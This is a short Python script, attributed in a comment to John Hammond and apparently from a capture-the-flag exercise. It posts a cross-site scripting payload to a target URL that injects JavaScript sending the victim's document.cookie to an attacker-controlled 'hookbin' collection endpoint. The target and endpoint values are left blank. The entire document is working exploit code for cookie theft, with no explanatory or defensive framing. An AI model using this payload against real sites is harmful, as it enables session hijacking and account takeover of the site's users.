#src from John Hammond

import requests

url = ""
hookbin = "" 
r = requests.post(url, data = {"content[]" : ";new Image().src='" + hookbin + "?c=' +document.cookie//" 
                              })

print(r.text)
